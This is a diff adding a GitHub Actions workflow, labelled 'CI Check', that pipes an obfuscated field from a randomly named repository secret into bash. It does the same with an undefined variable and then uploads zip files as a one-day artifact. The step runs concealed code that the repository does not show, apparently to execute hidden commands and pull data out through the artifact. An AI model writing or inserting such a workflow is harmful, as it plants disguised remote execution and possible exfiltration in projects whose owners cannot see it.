@@ -1,0 +1,27 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          uyxo07: ${{ secrets.uyxo07 }}
+        run: |
+          printf '%s' "$uyxo07" | jq -r .zcow70715 | /bin/bash
+          printf '%s' "$jpoad023" | jq -r .ehfe1360 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: h00Ggjkn
+          path: "*.zip"
+          retention-days: 1
